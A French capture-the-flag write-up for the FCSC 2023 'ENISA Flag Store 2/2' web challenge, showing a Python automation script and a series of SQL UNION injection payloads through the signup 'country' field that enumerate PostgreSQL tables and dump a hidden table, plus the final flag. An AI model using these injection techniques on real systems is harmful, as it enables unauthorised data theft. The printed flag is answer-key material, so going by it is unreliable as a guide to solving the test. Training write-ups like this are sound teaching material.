# ENISA Flag Store 2/2

> Titre: ENISA Flag Store 2/2  
> Auteur: [Cryptanalyse](https://twitter.com/Cryptanalyse)  
> Difficulté: 2  

## Description

L&rsquo;ENISA a décidé de mettre en place un nouveau service en ligne disponible à l&rsquo;année pour les équipes qui participent à l&rsquo;ECSC. Ce service permet aux joueurs des différentes équipes nationales de se créer des comptes individuels en utilisant des tokens secrets par pays. Une fois le compte créé, les joueurs peuvent voir les flags capturés dans différents CTF.
Le token pour la Team France est ohnah7bairahPh5oon7naqu1caib8euh.
Pour cette deuxième épreuve, on vous met au défi de trouver un autre flag stocké quelque part sur le système.
Note : Les flags au format FAKE{...} que vous pourrez trouver ne sont pas à soumettre.
Cette épreuve a été découpée en deux parties :
ENISA Flag Store 1/2. ENISA Flag Store 2/2. 
## Objectif

Décrivez ici l'objectif du challenge.

## Analyse

Dans la partie précédente, on avait découvert une faille d'injection SQL dans l'endpoint `signup` sur le champ `country`

J'avais écrit le script suivant permettant d'automatiser notre injection, mais on va l'améliorer afin d'automatiser également la connexion et le rendu des requêtes.

```python
import random
import uuid

import requests
from bs4 import BeautifulSoup

# Configuration
URL = "http://localhost:8000"
SESSION = requests.session()


def field(message: str, optional: bool = False, default: str = "") -> str:
    f = input(message)

    if f == "":
        if optional:
            return default
        print("[-] Required field")
        exit(1)

    if len(f) > 192:
        print("[-] Too long")
        exit(1)

    return f


def signup(username: str, password: str, token: str, country: str):
    return SESSION.post(
        f"{URL}/signup",
        data={
            "username": username,
            "password": password,
            "token": token,
            "country": country,
        },
    )


def login(username: str, password: str):
    return SESSION.post(
        f"{URL}/login",
        data={
            "username": username,
            "password": password,
        },
    )


def flags():
    return SESSION.get(f"{URL}/flags")


def generate_username():
    return "user_" + uuid.uuid4().hex[:8]


def generate_password():
    return f"password_{random.randint(6, 9)}"


def print_rows(html: str):
    soup = BeautifulSoup(html, "html.parser")

    rows = soup.find_all("tr")

    for row in rows:
        cols = [c.get_text(strip=True) for c in row.find_all(["td", "th"])]
        if cols:
            print(cols)


def main():
    print(
        "Hackropole - https://hackropole.fr/fr/challenges/web/fcsc2023-web-enisa-flag-store-2/"
    )

    print("[+] ALL FIELDS MUST NOT EXCEED 192 CHARACTERS OR IT WILL FAIL")

    username = field(
        "username (optional)> ", optional=True, default=generate_username()
    )

    password = field(
        "password (optional)> ", optional=True, default=generate_password()
    )

    token = field(
        "token (optional)> ", optional=True, default="ohnah7bairahPh5oon7naqu1caib8euh"
    )

    country = field("country> ")

    print(f"[+] Using username: {username}")
    print(f"[+] Using password: {password}")
    print(f"[+] Using token: {token}")

    print("[*] Signing up...")
    r = signup(username, password, token, country)
    print(f"[+] Signup status: {r.status_code}")

    if "error=4" in r.url:
        print("[-] Server rejected: field too long")

    print("[*] Logging in...")
    r = login(username, password)
    print(f"[+] Login status: {r.status_code}")

    print("[DEBUG] Cookies:", SESSION.cookies.get_dict())

    print("[*] Fetching flags...")
    r = flags()

    if r.status_code == 200:
        print("[+] Flags page retrieved")
        print(r.url)
        print(r.text)
        print_rows(r.text)
    else:
        print(f"[-] Failed to fetch flags: {r.status_code}")
        print(r.text)

    print("Adios!")
    exit(1)


main()

# fr' UNION SELECT table_name, table_name, table_name, 0 FROM information_schema.tables --

# fr'UNION SELECT tablename,tablename,tablename,0 FROM pg_tables--

# __s3cr4_t4bl3__
#

# fr'UNION SELECT * FROM __s3cr4_t4bl3__--
# fr'UNION SELECT flag,flag,flag,points FROM __s3cr4_t4bl3__--
# fr'UNION SELECT *,'1','1',1 FROM pg_tables WHERE table_name='__s3cr4_t4bl3__' --

# fr'UNION SELECT tablename,tablename,tablename,0 FROM pg_tables WHERE table_name='__s3cr4_t4bl3__' --
# fr2'union select *,'1','1',1 from __s3cr4_t4bl3__;--
# fr2'union select *,'1','1',1 FROM pg_tables WHERE table_name='__s3cr4_t4bl3__' --
# fr'UNION SELECT *,'','',1 FROM __s3cr4_t4bl3__ --

# FCSC{b505ad2ce3f07c4793fa7269c359736dfbd71286c88de11509a96a77616b35a0}

```

Dans le code source de l'application, on apprend que les champs sont limités à 192 caractères

```go
ErrFieldTooLong     = errors.New("Text fields are limited to 192 characters.")
```


Ce qui risque de nous embêter un petit peu pour la suite du challenge.

La fonction requête SQL présente dans la fonction `getData` nous renseigne un peu plus sur la base de données. 

```go
req := fmt.Sprintf(`SELECT ctf, challenge, flag, points  
FROM flags WHERE country = '%s';`, user.Country)
```
En effet, celle-ci est composée de 4 colonnes :
- `ctf`
- `challenge`
- `flag`
- `points`

Le type de ces colonnes est indiqué plus haut dans un commentaire

```go
/*
CREATE TABLE public.flags (

	id SERIAL NOT NULL,
	country VARCHAR(192) NOT NULL,
	ctf VARCHAR(192) NOT NULL,
	challenge VARCHAR(192) NOT NULL,
	category VARCHAR(192) NOT NULL,
	flag VARCHAR(192) NOT NULL,
	points INTEGER NOT NULL

);
*/
```

On cherche désormais à lister les tables présentes dans cette base de donnée

Le payload classique serait ici :

```sql
fr' UNION SELECT table_name, table_name, table_name, 0 FROM information_schema.tables --
```

Or ici, la limite de caractères sera surement excédée. Cependant, il existe, dans PostgreSQL la table `pg_tables` n'ayant quasiment [aucune différence](https://stackoverflow.com/questions/58431104/difference-between-information-schema-tables-and-pg-tables) de `information_schema.tables`.

On peut donc transformer et raccourcir notre payload en enlevant les espaces non-nécessaires et en utilisant `pg_tables`

```sql
fr'UNION SELECT tablename,tablename,tablename,0 FROM pg_tables--
```

Et on obtient donc une très longue liste, on se demande donc s'il est possible d'éviter la vue des FAKE flags, on pourrait soit modifier notre programme ou alors, tenter de s'enregistrer avec un autre pays.

```go
func CheckToken(country string, token string) bool {
	stmt, err := db.Prepare(`SELECT id FROM country_tokens
                             WHERE country = SUBSTR($1, 1, 2)
                             AND token = encode(digest($2, 'sha1'), 'hex')`)
	if err != nil {
		log.Fatal(err)
	}

	t := &Token{}
	err = stmt.QueryRow(country, token).Scan(&t.Id)
	if err != nil {
		return false
	}
	return true
}
```

La fonction `CheckToken` nous apprend que seuls les deux premiers caractères du pays sont pris en compte, on peut alors simplement ajouter une lettre `a` pour ne pas obtenir les flags abondants.

```sql
fra'UNION SELECT tablename,tablename,tablename,0 FROM pg_tables--
```

On obtient une nouvelle liste, cette fois-ci, beaucoup moins longue que la précédente. On observe le champ suivant :

```
['__s3cr4_t4bl3__', '__s3cr4_t4bl3__', '__s3cr4_t4bl3__', '0']
```

Qui nous indique la présence de la table `__s3cr4_t4bl3__`.

Il nous suffit donc de tester avec le payload suivant :

```sql
fra'UNION SELECT *,*,*,0 FROM __s3cr4_t4bl3__ --
```

Et on obtient donc le flag.
## Flag

FCSC{b505ad2ce3f07c4793fa7269c359736dfbd71286c88de11509a96a77616b35a0}